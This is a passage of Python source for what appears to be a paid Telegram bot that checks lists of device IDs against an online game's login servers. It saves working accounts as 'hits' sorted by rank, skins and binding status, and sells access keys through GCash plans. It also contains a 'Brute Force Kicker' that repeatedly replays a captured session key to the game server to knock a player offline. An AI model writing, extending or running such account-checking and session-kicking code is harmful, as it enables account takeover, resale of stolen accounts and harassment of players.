        payload = build_account_payload(device, acc, zone, pd)
        json_dir = os.path.join(base, FOLDERS["json"])
        os.makedirs(json_dir, exist_ok=True)
        with open(os.path.join(json_dir, f"{acc}_{zone}_{device[:12]}.json"),
                  "w", encoding="utf-8") as jf:
            jf.write(format_account_details_json(payload))
    except Exception as e:
        log.debug(f"JSON save skipped: {e}")

    if is_banned:
        banned_file = os.path.join(base, FOLDERS["error"], "banned_accounts.txt")
        os.makedirs(os.path.dirname(banned_file), exist_ok=True)
        with save_lock:
            with open(banned_file, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return

    nick = pd.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""): return

    skin   = _safe_int(pd.get('skin_count', 0), 0)
    v2l    = pd.get('v2l_status',  'N/A')
    v2l_text = ("ACTIVE"   if str(v2l).lower() in ('enabled','yes','1','true') else
                "INACTIVE" if str(v2l).lower() in ('disabled','no','0','false') else "N/A")

    cur_rank     = pd.get('current_rank', 'Unranked')
    rank_category= get_rank_category(cur_rank)
    card_text    = format_account_details_text(build_account_payload(device, acc, zone, pd))

    rank_files = {
        "warrior": os.path.join(base, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite":   os.path.join(base, FOLDERS["rank_elite"],   "elite_hits.txt"),
        "master":  os.path.join(base, FOLDERS["rank_master"],  "master_hits.txt"),
        "gm":      os.path.join(base, FOLDERS["rank_gm"],      "grandmaster_hits.txt"),
        "epic":    os.path.join(base, FOLDERS["rank_epic"],    "epic_hits.txt"),
        "legend":  os.path.join(base, FOLDERS["rank_legend"],  "legend_hits.txt"),
        "mythic":  os.path.join(base, FOLDERS["rank_mythic"],  "mythic_hits.txt"),
    }
    rank_folder = rank_files.get(rank_category)

    with save_lock:
        all_file = os.path.join(base, FOLDERS["detail"], "all_hits_detail.txt")
        os.makedirs(os.path.dirname(all_file), exist_ok=True)
        if not is_already_saved(device, all_file):
            with open(all_file, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
        raw_file = os.path.join(base, FOLDERS["detail"], "raw_devices_detail.txt")
        if not is_already_saved(device, raw_file):
            with open(raw_file, "a", encoding='utf-8') as f:
                f.write(f"{device}\n")
        if rank_folder:
            os.makedirs(os.path.dirname(rank_folder), exist_ok=True)
            if not is_already_saved(device, rank_folder):
                with open(rank_folder, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
        if v2l_text == "ACTIVE":
            vf = os.path.join(base, FOLDERS["v2l_active"], "v2l_active.txt")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            vf = os.path.join(base, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1
        if skin >= 200:
            sf = os.path.join(base, FOLDERS["sultan"], "sultan.txt")
            os.makedirs(os.path.dirname(sf), exist_ok=True)
            if not is_already_saved(device, sf):
                with open(sf, "a", encoding='utf-8') as f: f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

# ────────────────────────────────────────────────────────────────
# DETAIL CHECK ENGINE  (ONLY known tags — no guessing)
# ────────────────────────────────────────────────────────────────

def _pick_tag(dicts: List[dict], tag: int, default=None):
    """Return value of the first dict (in priority order) that has this exact tag."""
    for d in dicts:
        if isinstance(d, dict) and tag in d:
            v = d.get(tag)
            if v is not None:
                return v
    return default

def _extract_player_data(conn, account_id: int, zone_id: int, device_id: str) -> Optional[dict]:
    skin_info = conn.get_skin_role_info(account_id, zone_id) or {}
    ban_stat  = conn.check_ban_status()
    v2l       = get_v2l_status(conn, account_id, zone_id)
    result    = conn.lookup_player(account_id) or {}
    role_info = conn.get_role_info(account_id, zone_id) or {}

    # pd = primary player lookup payload
    pd = {}
    if isinstance(result, dict):
        if isinstance(result.get(0), list) and result[0] and isinstance(result[0][0], dict):
            pd = result[0][0]
        elif isinstance(result.get(0), dict):
            pd = result[0]
        else:
            pd = result

    skin_info = skin_info if isinstance(skin_info, dict) else {}
    role_info = role_info if isinstance(role_info, dict) else {}
    pd        = pd        if isinstance(pd, dict)        else {}

    sources = [pd, skin_info, role_info]

    # ─── ONLY KNOWN TAGS ───
    nick  = _safe_str(_pick_tag(sources, 2), f"Player_{account_id}")
    level = _safe_int(_pick_tag(sources, 3, 0), 0)

    skin_cnt = _safe_int(_pick_tag([skin_info, pd], 10, 0), 0)
    if skin_cnt == 0:
        skin_cnt = _safe_int(pd.get(83, 0), 0)
    hero_cnt = _safe_int(_pick_tag([skin_info, role_info, pd], 9, 0), 0)

    cur_rank_val = _safe_int(_pick_tag([pd, skin_info, role_info], 8, 0), 0)
    if cur_rank_val == 0:
        cur_rank_val = _safe_int(_pick_tag([skin_info, role_info], 6, 0), 0)
    max_rank_val = _safe_int(_pick_tag([pd, skin_info], 95, 0), 0)
    if max_rank_val == 0:
        max_rank_val = _safe_int(_pick_tag([skin_info, role_info], 15, 0), 0)

    created_raw = _safe_int(_pick_tag([pd], 42, 0), 0) or conn.creation_ts
    created_at  = "--"
    account_age = "--"
    if created_raw > 0:
        dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
        created_at  = dt.strftime("%Y-%m-%d %H:%M:%S")
        account_age = compute_account_age(created_raw)

    # Skin tiers — only from skin_list at tag 92 of skin_info
    skin_list  = skin_info.get(92, []) if isinstance(skin_info, dict) else []
    skin_tiers = parse_skin_tiers(skin_list) if isinstance(skin_list, list) else {
        'supreme': 0, 'grand': 0, 'exquisite': 0, 'deluxe': 0, 'exceptional': 0, 'common': 0
    }
    if not any(skin_tiers.values()):
        skin_tiers['common'] = skin_cnt

    # Fields we cannot extract from our 8 requests -> "--" (honest, not guessed)
    player_data = {
        'nickname':         nick,
        'level':            level,
        'skin_count':       skin_cnt,
        'hero_count':       hero_cnt,
        'current_rank':     map_rank(cur_rank_val),
        'highest_rank':     map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
        'ban_status':       ban_stat,
        'ban_reason':       getattr(conn, 'ban_reason', ''),
        'ban_remaining':    getattr(conn, 'ban_remaining', ''),
        'v2l_status':       v2l,
        'created_at':       created_at,
        'account_age':      account_age,
        'skin_tiers':       skin_tiers,
        'device_id':        device_id,
        'account_id':       account_id,
        'zone_id':          zone_id,
        # Not available from current requests:
        'location':         '--',
        'last_login':       '--',
        'achievement_points': 0,
        'collector_points':   0,
        'squad':            '--',
        'bindings':         '--',
        'hero_history':     '--',
        'country':          '--',
        'last_login_country':'--',
        'creation_country': '--',
        'last_battle':      '--',
        'featured_skin':    '--',
        'favourite_skins':  '--',
        'recent_skin':      '--',
        'skin_log':         f"{skin_cnt} skins tracked",
        'top_played':       '--',
        'recent_matches':   '--',
    }
    return player_data

def dump_debug_files(conn, device_id: str) -> str:
    """Dump every raw SDP response we got for this device to disk."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_dev = re.sub(r'[^A-Za-z0-9_-]', '_', device_id)[:40]
    folder = os.path.join(DEBUG_DIR, f"{safe_dev}_{ts}")
    os.makedirs(folder, exist_ok=True)

    for name, obj in (conn.last_raw_responses or {}).items():
        plain = sdp_to_plain(obj)
        with open(os.path.join(folder, f"{name}.json"), "w", encoding="utf-8") as f:
            json.dump(plain, f, indent=2, ensure_ascii=False)

    # Also create a combined summary
    with open(os.path.join(folder, "_SUMMARY.txt"), "w", encoding="utf-8") as f:
        f.write(f"Device: {device_id}\n")
        f.write(f"Account: {conn.account_id}  Zone: {conn.zone_id}\n")
        f.write(f"Ban status: {conn.ban_status}\n")
        f.write(f"Ban reason: {conn.ban_reason}\n")
        f.write(f"Ban remaining: {conn.ban_remaining}\n")
        f.write(f"Creation TS: {conn.creation_ts}\n")
        f.write(f"Game server: {conn.game_host}:{conn.game_port}\n")
    return folder

def process_detail(device_id: str, account_id: int, zone_id: int, out_dir: str = None) -> Tuple[bool, Optional[dict]]:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                if 'ban' in conn.ban_status.lower():
                    save_account(
                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                        {'ban_status': conn.ban_status, 'nickname': 'BANNED',
                         'ban_reason': conn.ban_reason, 'ban_remaining': conn.ban_remaining},
                        "detail", out_dir
                    )
                return False, None
            if not conn.get_game_server() or not conn.connect_to_game_server():
                return False, None

            pd = _extract_player_data(conn, account_id, zone_id, device_id)
            if not pd:
                return False, None

            save_account(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                pd, "detail", out_dir
            )
            return True, pd
    except Exception as e:
        log.error(f"process_detail error: {e}")
        return False, None

# ────────────────────────────────────────────────────────────────
# BRUTE FORCE
# ────────────────────────────────────────────────────────────────

def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone: return None
    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server(): return None
        if not conn.get_game_server() or not conn.connect_to_game_server(): return None
        skin_info    = conn.get_skin_role_info(acc, zone) or {}
        ban_stat     = conn.check_ban_status()
        sess_key     = conn.session_key
        gs_host      = conn.game_host
        gs_port      = conn.game_port
        creation_ts  = conn.creation_ts
        conn.cleanup()
        skin_info  = skin_info if isinstance(skin_info, dict) else {}
        nick       = _safe_str(skin_info.get(2), f"Player_{acc}")
        level      = _safe_int(skin_info.get(3), 1)
        skin_cnt   = _safe_int(skin_info.get(10), 0)
        hero_cnt   = _safe_int(skin_info.get(9), 0)
        cur_rank_v = _safe_int(skin_info.get(6, 0), 0)
        max_rank_v = _safe_int(skin_info.get(15, 0), 0) or cur_rank_v
        return {
            'device_id':    device_id,
            'account_id':   acc,
            'session_key':  sess_key,
            'zone_id':      zone,
            'game_host':    gs_host,
            'game_port':    gs_port,
            'gs_info':      f"{gs_host}:{gs_port}",
            'nickname':     nick,
            'level':        level,
            'rank':         map_rank(cur_rank_v),
            'skin_count':   skin_cnt,
            'hero_count':   hero_cnt,
            'ban_status':   ban_stat,
        }
    except: return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0   = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body_struct = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'],    4: CLIENT_VERSION,
            13: CHANNEL,              15: profile['device_id']
        }).data
        pkt   = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        q = b''
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        got_ack = False
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            got_ack = len(q) >= sz
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK" if got_ack else "SENT")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

# ────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ────────────────────────────────────────────────────────────────

active_jobs: Dict[int, Dict] = {}
job_lock  = threading.Lock()
start_time = time.time()

_bf_stop_flags: Dict[int, threading.Event] = {}
_bf_lock = threading.Lock()

# ────────────────────────────────────────────────────────────────
# USER MANAGER
# ────────────────────────────────────────────────────────────────

class UserManager:
    def __init__(self):
        self._load_data()

    def _load_data(self):
        if USERS_FILE.exists():
            try:
                data = json.loads(USERS_FILE.read_text())
                self.users = data if "users" in data else {"users": {}}
            except: self.users = {"users": {}}
        else: self.users = {"users": {}}
        if KEYS_FILE.exists():
            try:
                data = json.loads(KEYS_FILE.read_text())
                self.keys = data if "keys" in data else {"keys": {}}
            except: self.keys = {"keys": {}}
        else: self.keys = {"keys": {}}
        self._save_users_sync(); self._save_keys_sync()

    def _save_users_sync(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _save_keys_sync(self):  KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._save_users_sync()
    async def _save_keys(self):  self._save_keys_sync()

    async def register_user(self, user_id: int, username: str = None, first_name: str = None):
        uid = str(user_id)
        if uid not in self.users["users"]:
            self.users["users"][uid] = {
                "username": username, "first_name": first_name,
                "joined": datetime.now().isoformat(),
                "banned": False, "key_expiry": None,
                "threads_limit": MAX_THREADS_DEFAULT,
                "stats": {"total_checked": 0, "total_hits": 0},
                "vip": False, "activated": False,
            }
            await self._save_users()
            return True
        return False

    async def is_authorized(self, user_id: int) -> Tuple[bool, str]:
        uid = str(user_id)
        if uid == str(OWNER_ID): return True, "admin"
        user = self.users["users"].get(uid)
        if not user: return False, "not_registered"
        if user.get("banned", False): return False, "banned"
        expiry = user.get("key_expiry")
        if expiry is None: return False, "no_key"
        try:
            if datetime.fromisoformat(expiry) < datetime.now(): return False, "key_expired"
        except: return False, "invalid_expiry"
        return True, "ok"

    async def set_key_expiry(self, user_id: int, expiry_dt: datetime):
        uid = str(user_id)
        if uid not in self.users["users"]: return False
        self.users["users"][uid]["key_expiry"] = expiry_dt.isoformat()
        self.users["users"][uid]["activated"]  = True
        await self._save_users()
        return True

    async def generate_key(self, duration: int, unit: str, quantity: int = 1, max_users: int = 1):
        if unit in ['lifetime', 'l']:
            expiry = datetime(9999, 12, 31, 23, 59, 59)
            unit_display = "🌟 Lifetime"
        else:
            unit_map = {'s':1,'m':60,'h':3600,'d':86400,'y':31536000,
                        'hours':3600,'days':86400,'months':2592000,'lifetime':0}
            seconds  = duration * unit_map.get(unit.lower(), 86400)
            expiry   = datetime.now() + timedelta(seconds=seconds)
            unit_display = f"{duration} {unit}"
        keys = []
        for _ in range(quantity):
            key = f"PREM-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while key in self.keys["keys"]:
                key = f"PREM-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][key] = {
                "created": datetime.now().isoformat(),
                "expiry":  expiry.isoformat(),
                "used_by": [], "duration": unit_display,
                "max_users": max_users, "dtype": unit, "dval": duration,
            }
            keys.append(key)
        await self._save_keys()
        return keys, unit_display

    async def redeem_key(self, user_id: int, key: str) -> Tuple[bool, str]:
        uid = str(user_id)
        kd = self.keys["keys"].get(key)
        if not kd: return False, "Invalid key"
        used = kd.get("used_by", [])
        if uid in used: return False, "Key already used by you"
        if len(used) >= kd.get("max_users", 1): return False, "Key max users reached"
        exp = datetime.fromisoformat(kd["expiry"])
        if exp < datetime.now(): return False, "Key expired"
        used.append(uid); kd["used_by"] = used
        await self._save_keys()
        await self.set_key_expiry(user_id, exp)
        return True, f"Key redeemed! Valid until {exp.strftime('%Y-%m-%d %H:%M')}"

    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, user_id: int): return self.users["users"].get(str(user_id))

    async def get_threads_limit(self, user_id: int) -> int:
        u = self.users["users"].get(str(user_id))
        return u.get("threads_limit", MAX_THREADS_DEFAULT) if u else MAX_THREADS_DEFAULT

    async def set_threads_limit(self, user_id: int, limit: int) -> bool:
        u = self.users["users"].get(str(user_id))
        if not u: return False
        if not (MIN_THREADS <= limit <= MAX_THREADS_LIMIT): return False
        u["threads_limit"] = limit
        await self._save_users()
        return True

    async def ban_user(self, user_id: int):
        u = self.users["users"].get(str(user_id))
        if u: u["banned"] = True; await self._save_users(); return True
        return False

    async def unban_user(self, user_id: int):
        u = self.users["users"].get(str(user_id))
        if u: u["banned"] = False; await self._save_users(); return True
        return False

    async def add_vip(self, user_id: int):
        u = self.users["users"].get(str(user_id))
        if u: u["vip"] = True; u["activated"] = True; await self._save_users(); return True
        return False

    async def remove_vip(self, user_id: int):
        u = self.users["users"].get(str(user_id))
        if u: u["vip"] = False; await self._save_users(); return True
        return False

    async def update_stats(self, user_id: int, checked: int = 0, hits: int = 0):
        u = self.users["users"].get(str(user_id))
        if not u: return
        s = u.setdefault("stats", {})
        s["total_checked"] = s.get("total_checked", 0) + checked
        s["total_hits"]    = s.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ────────────────────────────────────────────────────────────────
# CONFIG + GCASH
# ────────────────────────────────────────────────────────────────

DEFAULT_CONFIG = {"locked": False, "txn_counter": 0}

def load_config():
    if CONFIG_FILE.exists():
        try:
            cfg = json.loads(CONFIG_FILE.read_text())
            for k, v in DEFAULT_CONFIG.items(): cfg.setdefault(k, v)
            return cfg
        except: pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg): CONFIG_FILE.write_text(json.dumps(cfg, indent=2))

def get_next_txn_number() -> int:
    cfg = load_config()
    cfg["txn_counter"] = cfg.get("txn_counter", 0) + 1
    save_config(cfg)
    return cfg["txn_counter"]

GCASH_PLANS = {
    "plan_3d":   {"label": "3 Days",   "price": "₱50",  "dtype": "days",     "dval": 3},
    "plan_7d":   {"label": "7 Days",   "price": "₱70",  "dtype": "days",     "dval": 7},
    "plan_30d":  {"label": "1 Month",  "price": "₱100", "dtype": "days",     "dval": 30},
    "plan_life": {"label": "Lifetime", "price": "₱150", "dtype": "lifetime", "dval": 0},
}

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────

def kb_no_key():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Buy Access Key", callback_data="menu_buy")],
        [InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ])

def kb_main_user():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Bulk Check (8-REQ)", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍 Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊 Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ])

def kb_main_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Bulk Check (8-REQ)", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍 Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊 Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="open_admin_panel")],
    ])

def kb_admin_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key",    callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users",      callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats",      callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running",    callback_data="adm_running")],
        [InlineKeyboardButton("🔒 Lock/Unlock",callback_data="adm_toggle_lock"),
         InlineKeyboardButton("🔄 Refresh",   callback_data="adm_refresh")],
    ])

def kb_gcash_plans():
    rows = []
    for pk, pd in GCASH_PLANS.items():
        rows.append([InlineKeyboardButton(
            f"{pd['label']}  ·  {pd['price']}",
            callback_data=f"gcash_sel:{pk}")])
    return InlineKeyboardMarkup(rows)

def kb_gcash_admin(buyer_uid, plan_key):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✔ APPROVE", callback_data=f"gcash_approve:{buyer_uid}:{plan_key}"),
        InlineKeyboardButton("✖ DENY",    callback_data=f"gcash_deny:{buyer_uid}:{plan_key}"),
    ]])

def fmt_expiry(exp):
    if not exp: return "Lifetime"
    try:
        e = datetime.fromisoformat(exp)
        if e < datetime.now(): return "Expired"
        diff = e - datetime.now()
        d, h = diff.days, diff.seconds // 3600
        m = (diff.seconds % 3600) // 60
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m and not d: parts.append(f"{m}m")
        return " ".join(parts) + " left"
    except: return exp

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def wrapper(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only.")
            return
        return await fn(update, context)
    return wrapper

# ────────────────────────────────────────────────────────────────
# ZIP
# ────────────────────────────────────────────────────────────────

TG_MAX_BYTES = 49 * 1024 * 1024

def zip_results(folder: Path) -> List[Path]:
    folder = Path(folder)
    files  = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files: zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX_BYTES: return [out]
        out.unlink()
        parts, pn, cur_files, cur_size = [], 1, [], 0
        for f in files:
            sz = f.stat().st_size
            if cur_files and cur_size + sz > TG_MAX_BYTES:
                pout = folder / f"results_part{pn}.zip"
                with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                    for cf in cur_files: zf.write(cf, cf.relative_to(folder))
                parts.append(pout); pn += 1; cur_files, cur_size = [], 0
            cur_files.append(f); cur_size += sz
        if cur_files:
            pout = folder / f"results_part{pn}.zip"
            with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                for cf in cur_files: zf.write(cf, cf.relative_to(folder))
            parts.append(pout)
        return parts
    except Exception as e:
        log.error(f"Zip error: {e}")
        return []

# ────────────────────────────────────────────────────────────────
# BULK JOB
# ────────────────────────────────────────────────────────────────

def run_bulk_job(job: dict, loop, app):
    user_id = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    devices = job["devices"]; threads = job["threads"]

    session_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = os.path.join(RESULTS_DIR, f"session_{user_id}_{session_ts}")
    os.makedirs(session_dir, exist_ok=True)
    for sub in FOLDERS.values():
        os.makedirs(os.path.join(session_dir, sub), exist_ok=True)

    stats = {"checked": 0, "total": len(devices), "hits": 0, "banned": 0, "failed": 0}
    job["stats"] = stats

    _last = [0.0]

    def update_msg(force=False):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        elapsed = int(now - job["started"])
        speed   = stats["checked"] / max(elapsed, 1)
        pct     = stats["checked"] / max(stats["total"], 1) * 100
        filled  = int(20 * pct / 100)
        bar     = "█" * filled + "░" * (20 - filled)
        text = (f"🔥 *{BOT_NAME} — Bulk Check*\n{'─'*32}\n\n"
                f"`{bar}` {pct:.1f}%\n\n"
                f"✅ Hits    : `{stats['hits']}`\n"
                f"🚫 Banned  : `{stats['banned']}`\n"
                f"❌ Failed  : `{stats['failed']}`\n"
                f"📊 Checked : `{stats['checked']}/{stats['total']}`\n"
                f"⚡ Speed   : `{speed:.1f}/s`\n"
                f"⏱ Elapsed : `{elapsed}s`\n")
        kb = [[InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id, text=text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except: pass

    import queue as _queue
    hit_queue = _queue.Queue()
    _last_hit = [0.0]

    def hit_sender():
        while True:
            msg = hit_queue.get()
            if msg is None: break
            for _ in range(3):
                try:
                    el = time.time() - _last_hit[0]
                    if el < 0.6: time.sleep(0.6 - el)
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML"), loop)
                    fut.result(timeout=20)
                    _last_hit[0] = time.time()
                    break
                except Exception as e:
                    log.error(f"Hit sender: {e}")
                    time.sleep(1.5)

    hs = threading.Thread(target=hit_sender, daemon=False); hs.start()

    def worker(device_id: str):
        if job.get("stopped"): return
        acc, zone, stat = GameLogin(device_id).run()
        if not acc or not zone:
            with job_lock:
                stats["checked"] += 1
                if 'ban' in stat.lower(): stats["banned"] += 1
                else:                     stats["failed"] += 1
                job["checked"] = stats["checked"]
            update_msg(); return

        success, pd = process_detail(device_id, acc, zone, session_dir)
        with job_lock:
            stats["checked"] += 1
            job["checked"] = stats["checked"]

        if success and pd:
            is_banned = 'ban' in str(pd.get('ban_status', '')).lower()
            if is_banned:
                with job_lock: stats["banned"] += 1
            else:
                if pd.get('nickname','') not in ('', 'N/A', 'unknown', 'guest'):
                    with job_lock: stats["hits"] += 1

            payload   = build_account_payload(device_id, acc, zone, pd)
            text_body = format_account_details_text(payload)

            try:
                json_dir = os.path.join(session_dir, FOLDERS["json"])
                os.makedirs(json_dir, exist_ok=True)
                with open(os.path.join(json_dir, f"{acc}_{zone}_{device_id[:12]}.json"),
                          "w", encoding="utf-8") as jf:
                    jf.write(format_account_details_json(payload))
            except: pass

            header = "🎯 <b>HITS FOUND</b>"
            if is_banned:
                header = "🎯 <b>HITS FOUND</b>  🔴 <b>BANNED</b>"
            hit_msg = (f"{header}\n"
                       f"<b>📋 ACCOUNT DETAILS (8-REQUEST FULL CHECK)</b>\n"
                       f"{telegram_pretty_block(text_body)}\n"
                       f"✨ <b>PREMIUM DEVID SEKER</b> · @SHINRT771")
            hit_queue.put(hit_msg)
        else:
            with job_lock: stats["failed"] += 1
        update_msg()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(worker, d) for d in devices]
        last_cnt = -1
        while True:
            with job_lock:
                cur  = stats["checked"]
                done = (cur >= stats["total"]) or job.get("stopped")
            if cur != last_cnt:
                last_cnt = cur; update_msg()
            if done: break
            time.sleep(0.05)
        update_msg(force=True)
        for f in futures: f.cancel()

    hit_queue.put(None)
    hs.join(timeout=180)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats["checked"], hits=stats["hits"]), loop)

    elapsed = int(time.time() - job["started"])
    speed   = stats["checked"] / max(elapsed, 1)
    summary = (f"🏁 *Bulk Check Complete!*\n{'─'*32}\n\n"
               f"📦 Total   : `{stats['total']}`\n"
               f"✅ Hits    : `{stats['hits']}`\n"
               f"🚫 Banned  : `{stats['banned']}`\n"
               f"❌ Failed  : `{stats['failed']}`\n\n"
               f"⏱ Time    : `{elapsed}s`\n"
               f"⚡ Speed   : `{speed:.1f}/s`\n\n"
               f"👑 *@SHINRT771*")

    time.sleep(1)
    edited = False
    for _ in range(4):
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                                          text=summary, parse_mode="Markdown"), loop)
            fut.result(timeout=30); edited = True; break
        except: time.sleep(2)
    if not edited:
        for _ in range(3):
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"), loop)
                fut.result(timeout=30); break
            except: time.sleep(2)

    try:
        zips = zip_results(Path(session_dir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(
                            app.bot.send_document(chat_id=chat_id, document=f,
                                                  filename=f"results_{session_ts}.zip"), loop)
                        fut.result(timeout=60)
                    break
                except: time.sleep(2)
        try: shutil.rmtree(session_dir, ignore_errors=True)
        except: pass
    except Exception as e:
        log.error(f"Zip send error: {e}")

    with job_lock: active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# BF JOB
# ────────────────────────────────────────────────────────────────

def run_bf_job(job: dict, loop, app):
    user_id=job["user_id"]; chat_id=job["chat_id"]; msg_id=job["msg_id"]
    profile=job["profile"]; loops=job["loops"]; delay=job["delay"]
    stop_ev=job["stop_event"]
    count=0; success=0; fail=0; lats=[]; t0=time.time()

    def update():
        el=int(time.time()-t0); avg=sum(lats)/len(lats) if lats else 0
        sp=count/max(el,1); ls=f"{count}/{loops}" if loops>0 else f"{count}/∞"
        text=(f"⚡ *Brute Force Kicker*\n{'─'*32}\n\n"
              f"👤 `{profile['nickname']}`\n🌐 `{profile['gs_info']}`\n\n"
              f"🔄 `{ls}`  ✅ `{success}`  ❌ `{fail}`\n"
              f"⚡ `{avg:.0f}ms`  🏃 `{sp:.2f}/s`  ⏱ `{el}s`\n")
        kb=[[InlineKeyboardButton("🛑 Stop BF", callback_data=f"stop_bf_{user_id}")]]
        try:
            fut=asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text,
                parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except: pass

    last=[0.0]
    while not stop_ev.is_set():
        count+=1
        ok,lat,_=send_session_kick(profile); lats.append(lat)
        if ok: success+=1
        else: fail+=1
        if time.time()-last[0]>=2.0:
            last[0]=time.time(); update()
        if loops>0 and count>=loops: break
        if delay>0: time.sleep(delay)

    el=int(time.time()-t0); avg=sum(lats)/len(lats) if lats else 0
    sp=count/max(el,1)
    summary=(f"📊 *BF Summary*\n{'─'*32}\n\n"
